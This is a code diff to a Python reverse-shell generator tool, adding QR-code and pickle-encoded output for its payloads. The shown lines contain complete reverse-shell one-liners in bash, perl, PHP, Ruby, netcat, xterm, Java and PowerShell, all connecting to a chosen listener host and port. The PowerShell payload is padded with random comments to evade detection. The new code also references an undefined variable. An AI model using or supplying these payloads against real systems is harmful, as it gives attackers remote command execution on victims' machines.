@@ -9,8 +9,12 @@ import os
 import base64
 import string
 import secrets
+import qrcode
 import binascii
 import urllib.parse
+import pickle
+
+from io import BytesIO
 banner = '''
 
             _.-'|''-._
@@ -58,31 +62,33 @@ class Reverse_Shell_Generator:
                                        +"));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);\
                                        os.dup2(s.fileno(),2);p=subprocess.call(['C:\\WINDOWS\\system32\\cmd.exe']);"
                 self.Base64()
+                self.QR_code(data=self.result)
             
             elif "bash" in self.args.type:
                     self.result=  "bash -i >& /dev/tcp/"+f'{self.args.LHOST}'+"/"+f'{self.args.LPORT}'+" 0>&1" 
                     self.Base64() 
+                    self.QR_code(data=self.result)
             elif "perl" in self.args.type:
                  self.result = "perl -e 'use Socket;$i="+f'{self.args.LHOST}'\
                         +";$p="+f'{self.args.LPORT}'+";socket(S,PF_INET,SOCK_STREAM,getprotobyname("\
                         +'"tcp"'+"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,"+'">&S"'\
                         +");open(STDOUT,"+'">&S"'+");open(STDERR,"+'">&S"'+");exec("+'"sh -i"'+");};'"
                  self.Base64()
-               
+                 self.QR_code(data=self.result)
             elif 'php' in self.args.type and not  self.args.pentestmonkey:
                  
                  self.result = "php -r '$sock=fsockopen("+'"'+f'{self.args.LHOST}'\
                          +'"'+","+f'{self.args.LPORT}'+");exec("\
                          +'"/bin/sh -i <&3 >&3 2>&3"'+");'"
                  self.Base64() 
-             
+                 self.QR_code(data=self.result)
             elif 'ruby' in self.args.type:
                  self.result = "ruby -rsocket -e'f=TCPSocket.open("+'"'\
                         +f'{self.args.LHOST}'+'"'+","+f'{self.args.LPORT}'\
                         +").to_i;exec sprintf("+'"/bin/sh -i <&%d >&%d 2>&%d"'\
                         +",f,f,f)"+"'"
                  self.Base64() 
-                
+                 self.QR_code(data=self.result)
             elif 'netcat' in self.args.type or 'nc' in self.args.type:
                  if not self.args.windows:
                        self.result = "nc -e /bin/sh "+f'{self.args.LHOST}'+" "+f'{self.args.LPORT}'
@@ -90,24 +96,23 @@ class Reverse_Shell_Generator:
                      if self.args.windows:
                        self.result = "nc.exe -e cmd "+f'{self.args.LHOST}'+" "+f'{self.args.LPORT}'
                  self.Base64()
-                  
+                 self.QR_code(data=self.result) 
             elif 'xterm' in self.args.type:
                  self.result = 'xterm -display '+f'{self.args.LHOST}'+':'+f'{self.args.LPORT}'
                  self.Base64() 
-                 
+                 self.QR_code(data=self.result)
             elif 'java' in self.args.type  and len(self.args.type)==4:
                   self.result = 'self.result = Runtime.getRuntime()'+'\n'+'process = self.result.exec(["/bin/bash","-c","exec 5<>/dev/tcp/'\
                            +f'{self.args.LHOST}'+'/'+f'{self.args.LPORT}'+';cat <&5 | while read line; do \\$line 2>&5 >&5; done"] as String[])'\
                            +'\n'+'process.waitFor()'
                   self.Base64()   
-                    
+                  self.QR_code(data=self.result)  
             elif 'powershell'  in self.args.type:
                  Table = string.ascii_letters + string.digits
                  Random_Value ='<# '+''.join(secrets.choice(Table) for i in range(20))+' #>'
                  self.result = '$client = New-Object '+ Random_Value +' System.Net.Sockets.TCPClient("'+f'{self.args.LHOST}'+'",'+f'{self.args.LPORT}'+'); '+Random_Value+' $stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0}; '+Random_Value+' while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);'+Random_Value+'$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + "PS " + $(gl) + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()'
                  self.Base64() 
- 
-                
+                 self.QR_code(data=self.result)
             elif 'php' in self.args.type  and self.args.pentestmonkey :
                   if os.path.exists('./Store_shell/PHP.php'):
                      os.remove("./Store_shell/PHP.php")
@@ -242,6 +247,8 @@ class Reverse_Shell_Generator:
             parser.add_argument("-I","--info"            , action='store_true'                        ,help ="print all support type of  the rverseshell ")
             parser.add_argument("-F","--onefile"         , action='store_true'                        ,help ="genetate python script revelshell  ")
             parser.add_argument("-U","--urlencode"       , action='store_true'                        ,help ="encode url format ")
+            parser.add_argument("--pickle", action='store_true',help="Data code url code ")
+            parser.add_argument("--QR", action ='store_true',help="paylaod QRcode Format")
             self.args = parser.parse_args()         
             if len(sys.argv)!=1 :
                pass
@@ -342,6 +349,32 @@ class Reverse_Shell_Generator:
             else :
                 print("\n"+"="*40+"\n\n"+"Upgrading a basic shell to a fully interactive TTY shell  \n\n"+Fprint[50:])
                 exit()
+        def QR_code(self,data):
+          if self.args.QR:
+              if self.args.pickle  :
+                   payload = base64.b64encode(
+                                pickle.dumps(self.result)
+                            ).decode()
+              else:
+                 payload  = data
+              qr = qrcode.QRCode(
+                        version=None,
+                        error_correction=qrcode.constants.ERROR_CORRECT_L,
+                        box_size=10,
+                        border=4
+                    )
+              qr.add_data(payload)
+              qr.make(fit=True)
+              qr.print_ascii()
+              img = qr.make_image(fill_color="black" , back_color="white").convert("RGB")
+              img = img.resize((600, 600))
+              path1 = "./Store_shell/"
+              filename = os.path.join(path1, f"{self.args.type}_QR.png")
+              img.save(filename)
+              print('\n'+'='*30 +'\n') 
+              print('[*] Generated  : Done !!')
+              print(f'[*] File Name  : {self.args.type}_QR.png')
+              print(f'[+] File Path  : {path}/{self.args.type}_QR.png')   
 
 if __name__=='__main__':
     Reverse_Shell_Generator()  
